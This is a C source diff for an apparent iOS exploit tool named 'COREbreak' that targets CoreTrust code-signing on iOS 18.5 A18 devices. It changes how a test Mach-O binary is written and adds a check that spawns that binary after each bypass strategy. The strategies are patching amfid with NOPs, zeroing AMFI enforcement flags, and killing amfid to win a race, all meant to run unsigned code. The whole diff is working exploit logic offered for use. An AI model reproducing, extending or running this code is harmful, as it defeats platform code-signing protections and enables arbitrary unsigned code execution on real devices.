@@ -56,18 +56,21 @@ static int find_pid_by_name(const char *name)
     return (int)result;
 }
 
-// Write a minimal test binary to a temp path and return the path.
-// Caller must free the returned string.
-static char *write_test_binary(void)
-{
-    const char *tmp = getenv("TMPDIR") ?: "/tmp";
-    size_t pathLen = strlen(tmp) + 32;
-    char *path = (char *)malloc(pathLen);
-    if (!path) return NULL;
-    snprintf(path, pathLen, "%s/ctbtest_XXXXXX", tmp);
+static char g_test_binary_path[4096] = "";
 
-    int fd = mkstemp(path);
-    if (fd < 0) { free(path); return NULL; }
+// Write a minimal test binary to a temp path and store the path globally.
+// Returns the path, or NULL on failure.
+const char *coretrust_write_test_binary(void)
+{
+    if (g_test_binary_path[0]) return g_test_binary_path;
+
+    const char *tmp = getenv("TMPDIR") ?: "/tmp";
+    char tmpl[4096];
+    snprintf(tmpl, sizeof(tmpl), "%s/ctbtest_XXXXXX", tmp);
+
+    int fd = mkstemp(tmpl);
+    if (fd < 0) return NULL;
+    strncpy(g_test_binary_path, tmpl, sizeof(g_test_binary_path) - 1);
 
     struct mach_header_64 hdr = {
         .magic = MH_MAGIC_64,
@@ -124,7 +127,7 @@ static char *write_test_binary(void)
     ftruncate(fd, 0x4000);
 
     close(fd);
-    return path;
+    return g_test_binary_path;
 }
 
 // ===========================================================================
@@ -414,26 +417,46 @@ bool coretrust_bypass_all(void)
            CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
     printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");
 
-    // No test binary file — any file I/O triggers SPTM after the exploit.
-    // Strategies 1-2 are trusted at their word.  Strategies 3+5 manage
-    // their own binaries internally.
+    const char *testPath = g_test_binary_path[0] ? g_test_binary_path : NULL;
+    if (testPath) {
+        printf("[COREbreak] test binary ready: %s\n", testPath);
+    } else {
+        printf("[COREbreak] no test binary — trusting strategy results\n");
+    }
+
+    // Helper: spawn test binary, return true if exit(0)
+    bool (^verify)(void) = ^{
+        if (!testPath) return false;
+        pid_t child = 0;
+        const char *argv[] = { testPath, NULL };
+        int ret = posix_spawn(&child, testPath, NULL, NULL,
+                              (char *const *)argv, NULL);
+        if (ret != 0 || child <= 0) return false;
+        int status;
+        waitpid(child, &status, 0);
+        return (WIFEXITED(status) && WEXITSTATUS(status) == 0);
+    };
 
     // [Step 1/4]: Strategy 1 — amfid NOP patch
-    bool nopOk = coretrust_amfid_nop_patch();
-    if (nopOk) {
-        printf("[COREbreak] amfid NOP applied — trusting strategy\n");
-        return true;
+    if (coretrust_amfid_nop_patch()) {
+        if (verify()) {
+            printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
+            return true;
+        }
+        printf("[COREbreak] amfid NOP applied but verification failed\n");
     }
 
     // [Step 2/4]: Strategy 2 — AMFI enforcement flags
-    bool flagsOk = coretrust_amfi_enforcement_flags_zero();
-    if (flagsOk) {
-        printf("[COREbreak] AMFI flags zeroed — trusting strategy\n");
-        return true;
+    if (coretrust_amfi_enforcement_flags_zero()) {
+        if (verify()) {
+            printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
+            return true;
+        }
+        printf("[COREbreak] AMFI flags zeroed but verification failed\n");
     }
 
     // [Step 3/4]: Strategy 3 — amfid kill + race
-    if (coretrust_kill_amfid_race("")) {
+    if (coretrust_kill_amfid_race(testPath ?: "")) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
         return true;
     }
